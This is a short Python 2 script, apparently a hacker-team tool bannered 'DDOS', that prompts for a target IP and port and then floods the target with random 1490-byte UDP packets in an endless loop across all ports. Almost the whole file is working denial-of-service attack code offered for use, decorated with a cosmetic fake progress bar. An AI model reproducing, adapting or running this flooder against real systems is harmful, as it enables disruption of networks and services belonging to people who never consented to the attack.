import sys
import os
import time
import socket
import random
#Code
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


print "\033[1;36;40m,------.  ,------.   ,-----.  ,---.\033[1;36;40m"
print "\033[1;36;40m|  .-.  \ |  .-.  \ '  .-.  ''   .-'\033[1;36;40m"
print "\033[1;36;40m|  |  \  :|  |  \  :|  | |  |`.  `-.\033[1;36;40m"
print "\033[1;36;40m|  '--'  /|  '--'  /'  '-'  '.-'    |\033[1;36;40m"
print "\033[1;36;40m`-------' `-------'  `-----' `-----'\033[1;36;40m"

#Banner End
print "\033[0;36mAuthor    : Lutfifakee\033[0;36m "
print "\033[0;36mTeam      : Padang Blackhat\033[0;36m "
print "\033[0;36mGithub    : https://github.com/Emperror7\033[0;36m "
print     
ip = raw_input("[*]Enter Target Ip : ")
port = int(raw_input("[*]Enter Target Port : "))

time.sleep(3)
print "[-------->           ] 45%"
time.sleep(3)
print "[------------>       ] 55%"
time.sleep(3)
print "[------------------->] 100%"
time.sleep(5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

